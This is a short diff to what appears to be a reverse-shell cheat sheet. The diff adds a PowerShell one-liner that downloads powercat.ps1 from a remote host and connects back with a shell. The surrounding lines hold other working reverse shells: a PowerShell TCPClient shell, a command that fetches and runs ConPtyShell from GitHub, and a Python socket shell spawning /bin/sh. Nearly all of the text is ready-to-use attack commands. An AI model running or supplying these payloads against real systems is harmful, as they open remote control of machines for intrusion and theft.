@@ -13,7 +13,10 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $c
 ```powershell
 powershell -c "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $IP 3001"
 ```
-
+### PowerShell 3
+```powershell
+echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1'); powercat -c 192.168.119.2 -p 4444 -e powershell" 
+```
 ### Python
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
